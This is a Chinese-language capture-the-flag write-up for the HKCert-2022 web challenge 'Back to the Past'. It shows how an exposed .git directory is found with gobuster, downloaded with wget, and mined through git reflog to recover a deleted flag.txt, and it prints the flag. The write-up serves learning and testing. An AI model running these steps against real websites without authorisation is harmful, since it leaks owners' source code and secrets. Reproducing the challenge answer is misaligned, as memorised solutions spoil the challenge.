# Writeup — Back to the Past (HKCert-2022, web/medium)

## 偵查：找到外露的 .git

首頁只是一個懷舊風的 `index.html`。nginx 設定 `autoindex on` 且網站根目錄就是 git 工作目錄，因此 `.git/` 整包對外可讀。用目錄爆破（gobuster / dirb / feroxbuster）或直接猜路徑即可命中：

```bash
gobuster dir -u http://victim:8080 -w /usr/share/wordlists/dirb/common.txt
# 命中 /.git/  （HEAD、config、objects/、logs/HEAD 皆可直接 GET）
curl http://victim:8080/.git/HEAD
```

## 拉回整個 repo

因為 autoindex 開著，可以直接遞迴抓下整個 `.git/`（或用 git-dumper）：

```bash
wget -q --recursive --no-parent http://victim:8080/.git/
cd victim:8080          # wget 以 host 名建立目錄
git status              # 這是一個合法的 git repo
```

## 關鍵：目前 HEAD 沒有 flag

檢查一般歷史會發現最新版看不到 flag：

```bash
git log --oneline
# 77fe6ae Final webpage
# a9c248a Initial
```

`flag.txt` 曾經被加入、又被 `git reset` 抹掉，所以它不在目前分支的線性歷史上。真正的線索在 **reflog / `git log --all`**，可看到一個被丟棄（dangling）的 commit：

```bash
git reflog
# 77fe6ae HEAD@{0}: commit: Final webpage
# a9c248a HEAD@{1}: reset: moving to a9c248a136bb24592cfe1dd14805dde9da321c4d
# 4ba5380 HEAD@{2}: commit: What is this?      <-- 可疑
# a9c248a HEAD@{3}: commit (initial): Initial
```

`logs/HEAD` 也直接記錄了這條 reset：`... commit: What is this?` 後緊接著 `reset: moving to a9c248a...`，代表 `4ba5380`（"What is this?"）加入了某個東西後被回退。

## 救回被刪除的秘密

`git show 4ba5380` 顯示這個 commit 正是「新增 `flag.txt`、刪除 `index.html`」：

```bash
git show 4ba5380
# diff --git a/flag.txt b/flag.txt
# new file mode 100644
# +hkcert22{...}
```

直接 checkout 該 commit（或 `git cat-file -p 4ba5380:flag.txt`）取回檔案：

```bash
git checkout -q 4ba5380
cat flag.txt
```

## Flag

`hkcert22{n0stalgic_w3bs1t3_br1ings_m3_b4ck_to_2000}`
